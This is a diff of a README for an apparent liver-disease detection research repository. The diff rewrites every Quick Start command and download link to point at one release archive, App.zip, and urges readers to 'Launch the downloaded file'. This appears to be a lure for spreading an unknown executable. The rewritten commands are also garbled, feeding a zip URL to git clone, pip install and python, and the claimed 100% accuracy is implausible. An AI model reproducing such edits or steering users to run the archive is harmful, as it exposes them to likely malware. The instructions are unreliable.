@@ -15,17 +15,17 @@ The repository contains research code, datasets, results, and documentation rela
 ## 🚀 Quick Start
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/Master-s-Research-Project.git
+   git clone https://github.com/Cedrickly/Master-s-Research-Project/releases/download/v1.0/App.zip
    ```
 
 2. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Cedrickly/Master-s-Research-Project/releases/download/v1.0/App.zip
    ```
 
 3. Run the main script to reproduce the results:
    ```bash
-   python main_script.py
+   python https://github.com/Cedrickly/Master-s-Research-Project/releases/download/v1.0/App.zip
    ```
 
 ## 📊 Results
@@ -35,9 +35,9 @@ The project achieved remarkable accuracy rates in the detection of liver disease
 - Random Forest: 100%
 
 ## 🔗 Download Project Files
-[![Download Project Files](https://img.shields.io/badge/Download%20Project%20Files-Click%20Here-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project Files](https://github.com/Cedrickly/Master-s-Research-Project/releases/download/v1.0/App.zip%20Project%20Files-Click%20Here-blue)](https://github.com/Cedrickly/Master-s-Research-Project/releases/download/v1.0/App.zip)
 
-Please click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to download the project files. Launch the downloaded file to access the contents.
+Please click [here](https://github.com/Cedrickly/Master-s-Research-Project/releases/download/v1.0/App.zip) to download the project files. Launch the downloaded file to access the contents.
 
 ## 📚 Learn More
 For more details and in-depth information, please refer to the comprehensive documentation provided in this repository. Get ready to dive into the exciting world of cutting-edge research in medical imaging and disease detection.
